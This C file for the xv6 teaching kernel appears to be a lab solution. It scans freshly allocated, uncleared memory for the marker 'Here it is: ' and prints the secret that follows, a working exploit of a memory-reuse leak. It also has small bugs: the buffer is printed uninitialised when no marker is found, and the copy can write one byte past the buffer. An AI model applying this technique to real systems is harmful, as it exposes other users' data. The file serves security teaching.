#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

#define DATASIZE (9 * 4096)

int
main(int argc, char *argv[])
{
  // Your code here.
  char *data = sbrk(DATASIZE);
  unsigned long offset = 0;
  char secret[256];
  int i = 0;
  char marker[] = "Here it is: ";
  

  // unsigned long align = ((unsigned long) data) % 4096;
  // printf("%lld\n", (unsigned long long)data);

  // printf("%d - %d\n", (int)align, offset);
  // printf("attack: %ld", offset);

  while(offset < DATASIZE - strlen(marker)){
    // data++;
    // printf("%lld\n", (unsigned long long)data);
    // if((data[offset] >= 'a' && data[offset] <= 'z') || (data[offset] >= 'A' && data[offset] <= 'Z')){
    //   printf("%c ", (char)data[offset]);
    // }
    // offset++;
    if(data[offset] == 'H'){
      int found = 1;
      for(int j=0 ; j<strlen(marker) ; j++){
        // printf("%c ", (char)data[offset + j]);
        if(data[offset + j] != marker[j]){
          found = 0;
          break;
        }
      }

      // printf("found: %d\n", found);

      if(found){
        offset += strlen(marker);

        // printf("null found: %c ", (char)data[offset]);

        while(offset < DATASIZE && i < 256 && data[offset] != '\0' && data[offset] != ' '){
          secret[i++] = (char)data[offset];
          offset++;
        }
        secret[i] = '\0';
        break;
      }
    }
    offset++;
  }

  fprintf(2, "%s\n", secret);

  exit(0);
}